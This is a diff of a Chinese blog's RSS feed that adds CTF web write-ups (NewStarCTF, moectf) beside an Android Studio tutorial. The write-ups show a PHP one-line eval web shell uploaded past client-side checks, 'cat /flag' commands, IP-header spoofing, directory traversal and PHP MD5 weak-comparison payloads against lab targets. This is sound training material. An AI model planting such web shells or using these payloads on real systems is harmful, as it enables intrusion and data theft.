@@ -5,14 +5,71 @@
         <link>http://example.com</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Sat, 07 Oct 2023 23:28:43 +0800</pubDate>
-        <lastBuildDate>Sat, 07 Oct 2023 23:28:43 +0800</lastBuildDate>
+        <pubDate>Wed, 11 Oct 2023 13:45:30 +0800</pubDate>
+        <lastBuildDate>Wed, 11 Oct 2023 13:45:30 +0800</lastBuildDate>
         <category>android studio</category>
         <category>安卓开发</category>
+        <category>web</category>
+        <category>newstarctf</category>
         <category>reverse</category>
         <category>西电ctf</category>
-        <category>web</category>
         <category>菜狗杯ctf</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2023/10/11/NewStarCTF-WEB/</guid>
+            <title>NewStarCTF-WEB</title>
+            <link>http://example.com/2023/10/11/NewStarCTF-WEB/</link>
+            <category>web</category>
+            <category>newstarctf</category>
+            <pubDate>Wed, 11 Oct 2023 13:45:30 +0800</pubDate>
+            <description><![CDATA[ &lt;hr&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;泄露的秘密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露的秘密&#34;&gt;#&lt;/a&gt; 泄露的秘密&lt;/h2&gt;
+&lt;p&gt;考的就是敏感信息的泄露 题目提示两个&lt;/p&gt;
+&lt;p&gt;无非就最简单的三种&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1.robots.txt
+
+2.www.zip
+
+3.index.php.swp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当然我的做法就是直接用 dirmap-master 扫描了 得到了 robots.txt 和 www.zip 文件，访问拼接就得到了 flag 了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/xQa41D2IqJ89PvR.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/bluETtRmCgXW5Q4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/lAkjnvKB6WfXMEx.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;being-of-upload&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#being-of-upload&#34;&gt;#&lt;/a&gt; Being of upload&lt;/h2&gt;
+&lt;p&gt;考的就是绕过&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTUlQUUlQTIlRTYlODglQjclRTclQUIlQUYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;客户端&lt;/span&gt; JavaScript 检验 上传一句话木马修改文件名后缀就行了&lt;/p&gt;
+&lt;p&gt;一句话木马内容；&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;?php eval($_POST[1]);?&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/pClORVIknGyB5tW.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到文件路径 我们可以直接利用蚁剑一把梭 也可也 RCE&lt;/p&gt;
+&lt;p&gt;节省时间 我们直接使用 rce 访问路径 然后利用 POST 传参 1=system (‘cat /f*’);&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/qEwSlHPu2D3TGjA.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;being-of-http&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#being-of-http&#34;&gt;#&lt;/a&gt; Being of HTTP&lt;/h2&gt;
+&lt;p&gt;第一步：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/Hfn8kFQlB3DYiCj.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;get 传入 ctf 参数后：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/b5FhJ2QwKjACWgs.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;POST 传参 在源码得到得到传入的参数&lt;/p&gt;
+&lt;p&gt;Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk)&lt;/p&gt;
+&lt;p&gt;解码得到 n3wst4rCTF2023g00000d&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs plaintext&#34;&gt;payload:secret=n3wst4rCTF2023g00000d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/xpSh9cCi7L25svG.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;抓包修改 power 为 ctfer&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/ToM5nOQCXtFuhm1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/NDxrb164etzlYUm.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;改 User-Agent 为 NewStarCTF2023&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/tHWGpdwmqvJ25R8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1SZWZlcmVybmV3c3RhcmN0Zi1xbjYwYXU5MDNhLmNvbQ==&#34;&gt;改 Referer 为 newstarctf.com&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/Qa53orHBTZYfhyt.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现只能本地用户访问&lt;/p&gt;
+&lt;p&gt;这里测试三个就行 XFF client-ip X-Real-IP&lt;/p&gt;
+&lt;p&gt;发现 X-Real-IP 可行&lt;/p&gt;
+&lt;p&gt;我们添加 X-Real-IP：127.0.0.1 就可以了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/11/QrFNou6ViUAEyRw.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2023/10/07/AS%E7%AE%80%E6%98%93%E5%BE%AE%E4%BF%A1/</guid>
             <title>AS制作简易微信</title>
@@ -23,9 +80,18 @@
             <description><![CDATA[ &lt;hr&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;as-制作简易微信&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#as-制作简易微信&#34;&gt;#&lt;/a&gt; AS 制作简易微信&lt;/h1&gt;
-&lt;h2 id=&#34;实验目的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验目的&#34;&gt;#&lt;/a&gt; 实验目的&lt;/h2&gt;
+&lt;h2 id=&#34;作业目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#作业目标&#34;&gt;#&lt;/a&gt; 作业目标&lt;/h2&gt;
 &lt;p&gt;利用 android studio 制作一个类微信页面的框架，包含上中下布局，四个 tab 页面，点击底部按钮实现跳转功能&lt;/p&gt;
-&lt;h2 id=&#34;实验过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验过程&#34;&gt;#&lt;/a&gt; 实验过程&lt;/h2&gt;
+&lt;h2 id=&#34;技术说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#技术说明&#34;&gt;#&lt;/a&gt; 技术说明&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Android Studio&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Pixel 3a API 34&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;关键代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#关键代码&#34;&gt;#&lt;/a&gt; 关键代码&lt;/h2&gt;
 &lt;h3 id=&#34;基本框架实现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#基本框架实现&#34;&gt;#&lt;/a&gt; 基本框架实现&lt;/h3&gt;
 &lt;p&gt;准备工作：导入所需图片到 drawable 目录下：&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/07/Zx3UX21GiCYcarI.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
@@ -119,7 +185,7 @@
 &lt;h2 id=&#34;2web入门指北&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2web入门指北&#34;&gt;#&lt;/a&gt; 2.Web 入门指北&lt;/h2&gt;
 &lt;p&gt;解压后发现编码后是这样一个数字：&lt;/p&gt;
 &lt;p&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34; display=&#34;block&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;666&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mn&gt;61673&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;6257396&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mn&gt;5933526&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;6533637&lt;/mn&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;62454&lt;/mn&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mn&gt;7662575666564739666257396&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mn&gt;5131524758316379596&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mn&gt;396&lt;/mn&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;61474673624756755&lt;/mn&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;3055684958303&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d
-&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.6944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;666&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;61673&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6257396&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5933526&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6533637&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;62454&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7662575666564739666257396&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5131524758316379596&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;396&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;61474673624756755&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3055684958303&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;拿去 cyberchef 解码&lt;/p&gt;
 &lt;p&gt;先用 hex 再用 base64&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/09/30/cQajmFsqdounZJH.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
@@ -163,6 +229,37 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs plaintext&#34;&gt;&amp;lt;?php system(&amp;#x27;cat /flag&amp;#x27;);?&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;上传成功后，访问文件：&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/06/xXmeVH73BDRwd2a.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;7大海捞针&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7大海捞针&#34;&gt;#&lt;/a&gt; 7. 大海捞针&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;CHALLENGE: 大海捞针&lt;br&gt;
+ DESCRIPTION: 该死，之前的平行宇宙由于 flag 的泄露被一股神秘力量抹去，我们脱离了与那个宇宙的连接了！不过不用担心，看起来出题人傻乎乎的是具有泄露 flag 的概率的，我们只需要连接多个平行宇宙…（难道 flag 在多元宇宙里是全局变量吗）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;tips: 仅有这道题要用到扫描器，请不要将爆破速度调整过快，flag 是一定能找到的&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在 1-1000 个页面中的某一个页面里藏了 flag，写个 python 脚本遍历，找到 flag 即可：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;url = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;http://101.42.178.83:7771/?id=&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; _ &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1001&lt;/span&gt;):&lt;br&gt;    &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;#x27;[+] testing No.&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;_&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)&lt;br&gt;    req = requests.get(url=&lt;span class=&#34;hljs-string&#34;&gt;f&amp;#x27;&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;url&amp;#125;&lt;/span&gt;&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;_&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;moectf&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; req.text:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(req.text)&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/10/ceYB7WwuaHdo1XM.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;8moe图床&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8moe图床&#34;&gt;#&lt;/a&gt; 8.moe 图床&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;CHALLENGE: meo 图床&lt;br&gt;
+ DESCRIPTION: 我们准备了一个 meo (?) 图床用于上传一些图片&lt;/p&gt;
+&lt;p&gt;文件上传页面利用 bp 抓包，上传之后点击查看，发现 /images.php?name = 参数存在目录穿越，可以文件任意读取&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/10/f4jUGlvJqrtxuZX.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在数据包请求界面，构造访问 flag 的路径（这里是一层一层试出来的）&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/10/9zWLQ2eiybxN4OI.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到路径 Fl3g_n0t_Here_dont_peek!!!.php&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/10/10/xr16jEvmdu8c7Mn.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用 php 的弱类型比较构造 payload&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs plaintext&#34;&gt;/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=240610708&amp;amp;param2=QNKCDZO&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;php 中 == 是弱等于，不会比较变量类型；=== 是强等于，会先比较变量类型。&lt;br&gt;
+md5 后，“0e&amp;quot;开头跟数字的字符串（例如&amp;quot;0e123”）会当作科学计数法去比较，所以和 0 相等；&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;​	&lt;img data-src=&#34;https://s2.loli.net/2023/10/10/3beSKAzs8ktvGg1.png&#34; alt=&#34;图片.png&#34;&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
